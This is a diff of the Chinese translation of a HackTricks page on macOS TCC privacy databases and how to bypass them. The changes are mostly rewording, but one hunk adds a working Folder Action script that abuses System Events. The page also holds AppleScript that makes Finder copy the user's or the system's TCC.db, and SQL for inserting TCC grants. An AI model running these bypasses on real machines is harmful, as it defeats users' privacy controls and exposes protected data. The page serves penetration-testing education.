@@ -4,9 +4,9 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 如果您在**网络安全公司**工作，想在**HackTricks**上看到您的**公司广告**，或者想要获取**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 如果您在**网络安全公司**工作，想在**HackTricks**中看到您的**公司广告**，或者想要访问**最新版本的PEASS或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
+* 获取[**官方的PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
@@ -40,11 +40,11 @@ ps -ef | grep tcc
 
 * 系统范围的数据库位于 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
 * 该数据库受到 **SIP 保护**，因此只有 SIP 绕过才能写入它。
-* 用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 用于每个用户的偏好设置。
-* 该数据库受保护，因此只有具有高级 TCC 权限的进程（如完全磁盘访问）才能写入它（但它不受 SIP 保护）。
+* 针对每个用户偏好设置的用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**。
+* 该数据库受保护，因此只有具有高级 TCC 权限（如完全磁盘访问）的进程才能写入它（但它不受 SIP 保护）。
 
 {% hint style="warning" %}
-上述数据库也**受 TCC 保护以限制读取访问**。因此，除非是来自具有 TCC 权限的进程，否则您**无法读取**您的常规用户 TCC 数据库。
+上述数据库也**受 TCC 保护以限制读取访问**。因此，除非是来自具有 TCC 权限的进程，否则您**无法读取**常规用户的 TCC 数据库。
 
 然而，请记住，具有这些高权限的进程（如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）将能够写入用户的 TCC 数据库。
 {% endhint %}
@@ -59,7 +59,7 @@ ps -ef | grep tcc
 {% endhint %}
 
 {% hint style="info" %}
-**通知中心 UI** 可以在系统 TCC 数据库中进行**更改**：
+**通知中心 UI** 可以对系统 TCC 数据库进行**更改**：
 
 {% code overflow="wrap" %}
 ```bash
@@ -123,7 +123,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endtabs %}
 
 {% hint style="success" %}
-检查这两个数据库，你可以检查应用程序已允许、已禁止或没有的权限（它会请求权限）。
+检查这两个数据库，您可以检查应用程序已允许、已禁止或没有的权限（它将请求权限）。
 {% endhint %}
 
 * **`service`** 是 TCC **权限**的字符串表示形式
@@ -171,7 +171,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 </dict>
 </plist>
 ```
-<details>
+</details>
 
 * **`auth_value`** 可以有不同的值：denied(0), unknown(1), allowed(2), 或 limited(3)。
 * **`auth_reason`** 可以取以下值：Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
@@ -196,7 +196,7 @@ echo "X'$REQ_HEX'"
 您还可以在 `系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件与文件夹` 中检查**已授予应用程序的权限**。
 
 {% hint style="success" %}
-用户 _可以_ 使用 **`tccutil`** **删除或查询规则**。&#x20;
+用户_可以_使用 **`tccutil`** **删除或查询规则**。&#x20;
 {% endhint %}
 
 #### 重置 TCC 权限
@@ -234,9 +234,9 @@ csreq -t -r /tmp/telegram_csreq.bin
 应用程序**不仅需要** **请求**并已被**授予访问**某些资源的权限，它们还需要**具有相关的权限**。\
 例如，**Telegram** 有权限 `com.apple.security.device.camera` 来请求**访问摄像头**。一个**没有**这个**权限的应用程序将无法**访问摄像头（用户甚至不会被询问权限）。
 
-然而，对于应用程序来说，要**访问**某些用户文件夹，如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，它们**不需要**具有任何特定的**权限**。系统将透明地处理访问并在需要时**提示用户**。
+然而，对于应用程序来说，要**访问**某些**用户文件夹**，如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，它们**不需要**具有任何特定的**权限**。系统将透明地处理访问并在需要时**提示用户**。
 
-苹果的应用程序**不会生成提示**。它们在其**权限**列表中包含**预先授予的权利**，这意味着它们将**永远不会生成弹出窗口**，**也不**会出现在任何**TCC 数据库中**。例如：
+苹果的应用程序**不会生成提示**。它们包含在其**权限**列表中的**预先授予的权利**，这意味着它们将**永远不会生成弹出窗口**，**也不会**出现在任何**TCC 数据库中**。例如：
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -258,12 +258,12 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 ### 敏感的未受保护地方
 
 * $HOME（本身）
-* $HOME/.ssh、$HOME/.aws 等
+* $HOME/.ssh, $HOME/.aws 等
 * /tmp
 
 ### 用户意图 / com.apple.macl
 
-如前所述，可以通过将文件拖放到应用程序上来**授予应用程序对文件的访问权限**。这种访问不会在任何TCC数据库中指定，而是作为文件的**扩展属性**。此属性将**存储允许应用程序的UUID**：
+如前所述，可以通过将文件拖放到应用程序上来**授予应用程序对文件的访问权限**。这种访问不会在任何TCC数据库中指定，而是作为文件的**扩展** **属性**。此属性将**存储**允许应用程序的UUID：
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -279,18 +279,18 @@ otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| gr
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
 {% hint style="info" %}
-值得注意的是，**`com.apple.macl`** 属性是由 **Sandbox** 管理，而不是 tccd。
+值得注意的是，**`com.apple.macl`** 属性是由 **Sandbox** 管理的，而不是 tccd。
 
 另外请注意，如果您将允许计算机中某个应用的 UUID 的文件移动到另一台计算机，因为相同的应用将有不同的 UIDs，它不会授予那个应用访问权限。
 {% endhint %}
 
-扩展属性 `com.apple.macl` **无法像其他扩展属性那样被清除**，因为它受到 **SIP** 的保护。然而，正如[**这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，通过**压缩**文件、**删除**它然后**解压**，可以禁用它。
+扩展属性 `com.apple.macl` **无法像其他扩展属性那样被清除**，因为它受到 **SIP** 的保护。然而，正如[**这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，通过对文件进行**压缩**，**删除**然后**解压**，可以禁用它。
 
 ## TCC 权限提升与绕过
 
 ### 插入到 TCC
 
-如果您在某个时刻设法获得了对 TCC 数据库的写入权限，您可以使用类似以下的方法来添加一个条目（移除注释）：
+如果您在某个时刻设法获得了对 TCC 数据库的写入权限，您可以使用类似以下的方法添加一个条目（移除注释）：
 
 <details>
 
@@ -336,16 +336,16 @@ strftime('%s', 'now') -- last_reminded with default current timestamp
 ```
 </details>
 
-### 自动化到FDA\*
+### 自动化 (Finder) 到 FDA\*
 
-TCC中自动化权限的名称是：**`kTCCServiceAppleEvents`**\
-这个特定的TCC权限还指出了可以在TCC数据库中管理的**应用程序**（所以权限并不允许管理所有内容）。
+TCC 权限的自动化权限名称是：**`kTCCServiceAppleEvents`**\
+这个特定的 TCC 权限还表明了可以在 TCC 数据库中管理的**应用程序**（所以权限并不是允许管理所有东西）。
 
-**Finder**是一个**总是拥有FDA**的应用程序（即使它没有出现在UI中），所以如果你拥有对它的**自动化**权限，你可以滥用它的权限来**让它执行一些操作**。\
-在这种情况下，你的应用程序将需要对**`com.apple.Finder`**的**`kTCCServiceAppleEvents`**权限。
+**Finder** 是一个**始终拥有 FDA** 的应用程序（即使它没有出现在 UI 中），所以如果你拥有对它的**自动化**权限，你可以滥用它的权限来**让它执行一些操作**。\
+在这种情况下，你的应用程序需要对 **`com.apple.Finder`** 的 **`kTCCServiceAppleEvents`** 权限。
 
 {% tabs %}
-{% tab title="窃取用户的TCC.db" %}
+{% tab title="窃取用户的 TCC.db" %}
 ```applescript
 # This AppleScript will copy the system TCC database into /tmp
 osascript<<EOD
@@ -364,7 +364,7 @@ EOD
 ```
 {% endtab %}
 
-{% tab title="窃取系统的 TCC.db" %}
+{% tab title="窃取系统 TCC.db" %}
 ```applescript
 osascript<<EOD
 tell application "Finder"
@@ -385,9 +385,9 @@ EOD
 您可以利用这一点**编写您自己的用户TCC数据库**。
 
 {% hint style="warning" %}
-拥有这个权限，您将能够**请求finder访问受TCC限制的文件夹**并将文件给您，但据我所知，您**无法使Finder执行任意代码**以完全利用它的FDA访问权限。
+拥有这个权限，您将能够**要求Finder访问受TCC限制的文件夹**并将文件提供给您，但据我所知，您**无法使Finder执行任意代码**以充分利用其FDA访问权限。
 
-因此，您将无法完全利用FDA的能力。
+因此，您将无法充分利用FDA的功能。
 {% endhint %}
 
 这是获取对Finder自动化权限的TCC提示：
@@ -422,13 +422,56 @@ EOD
 ```
 </details>
 
-同样的情况发生在 **Script Editor 应用程序**，它可以控制 Finder，但使用 AppleScript 你不能强制它执行脚本。
+同样的情况也发生在**Script Editor app,** 它可以控制Finder，但使用AppleScript你不能强制它执行脚本。
 
-### 自动化 + 辅助功能（**`kTCCServicePostEvent`**）到 FDA\*
+### 自动化 (SE) 到某些TCC
 
-在 **`System Events`** 上的自动化 + 辅助功能（**`kTCCServicePostEvent`**）允许向进程发送 **按键指令**。通过这种方式，你可以滥用 Finder 来更改用户的 TCC.db 或者给任意应用程序授权 FDA（尽管这样做可能会提示输入密码）。
+系统事件可以创建文件夹操作，而文件夹操作可以访问一些TCC文件夹，因此可以使用如下脚本来滥用这种行为：
+```bash
+# Create script to execute with the action
+cat > "/tmp/script.js" <<EOD
+var app = Application.currentApplication();
+app.includeStandardAdditions = true;
+app.doShellScript("/Applications/iTerm.app/Contents/MacOS/iTerm2");
+EOD
 
-Finder 覆盖用户 TCC.db 的示例：
+osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"
+
+# Create folder action with System Events in "$HOME/Desktop"
+osascript <<EOD
+tell application "System Events"
+-- Ensure Folder Actions are enabled
+set folder actions enabled to true
+
+-- Define the path to the folder and the script
+set homeFolder to path to home folder as text
+set folderPath to homeFolder & "Desktop"
+set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"
+
+-- Create or get the Folder Action for the Desktop
+if not (exists folder action folderPath) then
+make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
+end if
+set myFolderAction to folder action folderPath
+
+-- Attach the script to the Folder Action
+if not (exists script scriptPath of myFolderAction) then
+make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
+end if
+
+-- Enable the Folder Action and the script
+enable myFolderAction
+end tell
+EOD
+
+# Open the folder, this won't be enough, but just getting out of it, or getting it is enough to trigger the folder action script
+open "$HOME/Desktop"
+```
+### 自动化 (SE) + 辅助功能 (**`kTCCServicePostEvent`)** 至 FDA\*
+
+在 **`系统事件`** 上的自动化 + 辅助功能 (**`kTCCServicePostEvent`**) 允许向进程发送 **按键指令**。通过这种方式，你可以滥用 Finder 来更改用户的 TCC.db 或者给任意应用授权完全磁盘访问权限（尽管这样做可能会提示输入密码）。
+
+以下是 Finder 覆写用户 TCC.db 的示例：
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -490,7 +533,7 @@ EOF
 
 ### **FDA到TCC权限**
 
-**全盘访问权限**在TCC中的名称是 **`kTCCServiceSystemPolicyAllFiles`**
+**完全磁盘访问**在TCC中的名称是 **`kTCCServiceSystemPolicyAllFiles`**
 
 我不认为这是一个真正的权限提升，但以防你发现它有用：如果你控制了一个有FDA的程序，你可以**修改用户的TCC数据库并给自己任何访问权限**。这可以作为一个持久性技术，以防你可能失去你的FDA权限。
 
@@ -553,8 +596,8 @@ AllowApplicationsList.plist：
 
 * 你在**网络安全公司**工作吗？你想在**HackTricks**看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏。
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **推特** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我。
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在**推特**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过提交 PR 到** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **分享你的黑客技巧。**
 
 </details>
